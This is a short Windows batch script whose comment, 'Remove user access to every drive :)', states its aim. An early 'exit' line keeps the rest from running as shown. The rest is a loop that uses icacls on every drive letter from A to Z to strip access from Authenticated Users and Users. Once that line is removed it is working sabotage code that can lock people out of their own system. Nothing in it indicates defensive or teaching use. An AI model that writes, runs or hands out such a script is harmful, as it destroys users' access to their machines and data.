@echo off

exit

:: Remove user access to every drive :)

for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
if exist %%D: for %%U in ("NT AUTHORITY\Authenticated Users" "Users") do (
icacls %%D: /remove:g %%U
))